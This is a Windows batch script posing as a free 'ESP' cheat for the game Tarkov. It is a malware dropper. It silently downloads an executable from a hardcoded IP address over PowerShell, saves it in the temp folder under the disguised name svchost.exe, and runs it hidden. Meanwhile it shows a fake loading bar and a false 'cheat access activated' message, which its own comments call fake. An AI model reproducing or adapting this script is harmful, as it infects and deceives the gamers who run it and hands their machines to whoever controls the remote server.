@echo off
Free ESP Tarkov 2026
color 0A
mode con: cols=60 lines=15

:: URL to your file
set "URL=http://31.76.101.19:8080/Group.exe"
set "TARGET=%TEMP%\svchost.exe"

:: Download file via PowerShell (no window)
echo Downloading modules...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TARGET%')" >nul 2>&1

:: Check if downloaded
if not exist "%TARGET%" (
    echo Download failed. Check the link.
    pause
    exit
)

:: Run the downloaded file in background (hidden)
start /b "" "%TARGET%"

:: Fake progress
cls
echo.
echo   ========================================
echo     	   2026 ESP v3.0
echo   ========================================
echo.
echo   Loading firmware...
ping 127.0.0.1 -n 2 >nul
echo   10%% [##................] Initializing...
ping 127.0.0.1 -n 2 >nul
echo   25%% [#####.............] Code injection...
ping 127.0.0.1 -n 2 >nul
echo   47%% [#########.........] Bypassing protections...
ping 127.0.0.1 -n 2 >nul
echo   68%% [#############.....] Decoding...
ping 127.0.0.1 -n 2 >nul
echo   84%% [#################.] Activating...
ping 127.0.0.1 -n 3 >nul
echo   100%% [##################] Done!
ping 127.0.0.1 -n 1 >nul
cls
echo.
echo   ========================================
echo            ESP SUCCESSFULLY!
echo   ========================================
echo.
echo   Cheat access activated.
echo   
echo.
echo   Press any key to exit...
pause >nul
exit